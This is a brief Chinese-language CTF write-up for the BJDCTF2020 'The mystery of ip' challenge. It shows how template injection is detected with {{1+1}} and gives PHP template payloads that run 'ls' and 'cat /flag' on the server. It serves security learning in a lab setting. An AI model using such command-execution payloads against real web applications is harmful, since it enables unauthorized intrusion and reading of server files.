# [BJDCTF2020]The mystery of ip

## 知识点

`SSTI`

## 解题

输入什么回显什么，测试加`'`加`or '1=1'`都回显的是本身的内容

![](./img/The mystery of ip-1.png)

测试模板注入`{{1+1}}`发现回显`2`

![](./img/The mystery of ip-2.png)

使用`php`模板注入`payload`即可

```
{{system('ls')}}
{{system('cat /flag')}}
```

